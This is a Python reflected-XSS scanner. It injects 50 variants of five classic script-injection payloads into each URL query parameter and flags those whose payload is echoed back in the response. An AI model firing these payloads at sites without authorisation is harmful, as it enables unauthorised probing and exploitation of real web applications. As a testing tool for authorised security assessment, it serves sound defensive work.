# xss_scanner.py
import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

def get_xss_payloads():
    """
    Returns 50 example XSS payloads derived from a seclist style list.
    """
    base_payloads = [
        "<script>alert(1)</script>",
        "\"'><img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "<body onload=alert(1)>",
        "<iframe src=javascript:alert(1)>"
    ]
    payloads = []
    for i in range(50):
        # Cycle through base payloads and append an index for variation.
        payload = base_payloads[i % len(base_payloads)] + f"<!--{i}-->"
        payloads.append(payload)
    return payloads

XSS_PAYLOADS = get_xss_payloads()

def advanced_xss_scan(url):
    """
    An advanced XSS scanner that injects 50 payloads into each GET parameter.
    It logs details of which payload is applied and collects any vulnerability found.
    Returns a dictionary with 'vulnerabilities' and 'details'.
    """
    vulnerabilities = []
    details = []
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)
    
    if not query_params:
        details.append("No query parameters found for injection testing.")
        return {"vulnerabilities": vulnerabilities, "details": details}
    
    for param in query_params:
        original_values = query_params[param]
        for payload in XSS_PAYLOADS:
            query_params[param] = [payload]
            new_query = urlencode(query_params, doseq=True)
            test_url = urlunparse((
                parsed_url.scheme,
                parsed_url.netloc,
                parsed_url.path,
                parsed_url.params,
                new_query,
                parsed_url.fragment
            ))
            try:
                
                resp = requests.get(test_url, timeout=5)
                details.append(f"Applied payload on '{param}': {payload}")
                if payload in resp.text:
                    vulnerabilities.append({
                        'parameter': param,
                        'payload': payload,
                        'test_url': test_url
                    })
            except Exception as e:
                details.append(f"Error on parameter '{param}' with payload {payload}: {str(e)}")
        query_params[param] = original_values
    return {"vulnerabilities": vulnerabilities, "details": details}

if __name__ == "__main__":
    test_url = "http://example.com?test=123"
    result = advanced_xss_scan(test_url)
    print(result) 

